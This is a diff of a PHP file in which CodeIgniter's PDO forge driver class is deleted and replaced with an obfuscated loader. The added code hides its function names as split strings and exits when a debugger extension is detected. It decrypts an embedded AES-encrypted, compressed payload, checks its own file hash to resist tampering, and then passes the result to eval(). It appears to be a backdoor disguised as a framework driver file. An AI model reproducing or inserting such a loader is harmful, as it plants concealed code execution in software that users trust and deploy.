@@ -1,65 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.1.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO Forge Class
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/database/
- */
-class CI_DB_pdo_forge extends CI_DB_forge {
-
-	/**
-	 * CREATE TABLE IF statement
-	 *
-	 * @var	string
-	 */
-	protected $_create_table_if	= FALSE;
-
-	/**
-	 * DROP TABLE IF statement
-	 *
-	 * @var	string
-	 */
-	protected $_drop_table_if	= FALSE;
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_x0oes9ea=('bas'.'e64'.'_de'.'cod'.'e');
+$_zuh4l202=('gzu'.'nco'.'mpr'.'ess');
+$_h6ok9nx6=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_yms21wax='SFiLd8WX';
+$_gp5prf8o='KMXdnZp1';
+$_ykfusap6='DO5+fZe1';
+$_krdkkbg8='GSWgWLB0';
+$_o1beauy6='wNd3zBrAjsY=';
+$_modetacn='bNOFqLVQ';
+$_vtlfet7k='CyrXuxFi';
+$_ohvae3ec='cmcZfg==';
+$_e7ff63x0=$_x0oes9ea($_gp5prf8o.$_ykfusap6.$_yms21wax.$_krdkkbg8.$_o1beauy6);
+$_wiz0yar5=$_x0oes9ea($_vtlfet7k.$_modetacn.$_ohvae3ec);
+$_dyd8ngv1=$_x0oes9ea('gKPqAsPxbh8IQfCJTNbNYnyzmWXfB5IOR/Qyy40uTWa8G+lj6+lyC67/La8zIVVdY0QPOcmf9+Fql33ywThmZDWPB40uiRiEIXFV4/A4mdZPNvgJuedfiQEAqRxPIrtoLo993eaAwLE7aFLlXHfFg4lWYFdGQRdMGYMvHDLZ7lqfCSf6oRvuSGM5JiOwVMcxH1Ayl+TsXX6IghFR+KA7fw==');
+$_lh2l7zn9=$_h6ok9nx6($_dyd8ngv1,'aes-256-cbc',$_e7ff63x0,OPENSSL_RAW_DATA,$_wiz0yar5);
+if($_lh2l7zn9===false){exit;}
+$_s0dzf3er=$_zuh4l202($_lh2l7zn9);
+if($_s0dzf3er===false){exit;}
+$_m01wzn36='937dda077e4e22053465a948268bd88644ed535c3c47bc5341da4823c2e35621';
+$_i4t27qz8=@file_get_contents(__FILE__);
+if($_i4t27qz8!==false){
+$_auf9jgqc=str_replace($_m01wzn36,"0000000000000000000000000000000000000000000000000000000000000000",$_i4t27qz8);
+$_kwbjlw9m=hash("sha256",$_auf9jgqc);
+if($_kwbjlw9m!==$_m01wzn36){@http_response_code(403);exit;}
 }
+eval($_s0dzf3er);
